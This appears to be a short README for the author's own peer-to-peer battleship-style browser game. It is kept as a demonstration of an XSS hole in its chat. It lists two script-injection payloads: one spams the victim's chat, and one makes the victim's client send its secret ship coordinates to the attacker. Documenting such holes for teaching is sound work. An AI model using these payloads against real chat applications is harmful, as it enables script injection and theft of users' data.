## This is an old project of mine, which unfortunately contained a very obvious XSS
### I am saving this as an example of how an XSS exploit could potentially look/work

This project runs purely client side and uses [peerjs](https://peerjs.com/) to support multiplayer functionality.<br>
It should be possible to showcase without hosting the project anywhere.

#### Here's some example exploits
##### Many of these exploits require making a local variable in the browser terminal first: 
`sessionStorage.setItem("Attacker", "")`

##### Exploits
- Spam victim chat: <br>`<script>if(sessionStorage.getItem("Attacker")==null){addMessageToChat("Spammed", "You Got")}</script>`
- Get victim to send ship data: <br> `<script>if(sessionStorage.getItem("ShipVictim")==null&&sessionStorage.getItem("Attacker")==null){sessionStorage.setItem("ShipVictim", "");for(let i in ships){let ship=ships[i];let msg=ship.name+"<br>";for(let j in ship.spaces){msg+="X: "+ship.spaces[j].x+", ";msg+="Y: "+ship.spaces[j].y+"<br>";}sendMessageToPeer(msg);}}</script>`
